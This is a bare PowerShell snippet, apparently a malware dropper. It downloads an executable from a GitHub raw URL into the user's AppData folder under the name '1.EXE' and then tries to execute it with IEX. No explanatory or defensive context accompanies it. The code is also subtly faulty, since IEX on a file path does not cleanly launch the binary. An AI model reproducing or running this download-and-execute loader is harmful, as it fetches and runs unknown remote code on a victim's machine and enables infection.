$FileName = "$env:appdata\\1.EXE";
$wc = New-Object System.Net.WebClient;
$wc.Encoding = [System.Text.Encoding]::Ascii;
$FileData = $wc.DownloadFile('https://raw.githubusercontent.com/meiqiu/qqqq/main/main.exe', $FileName);
IEX $FileName;
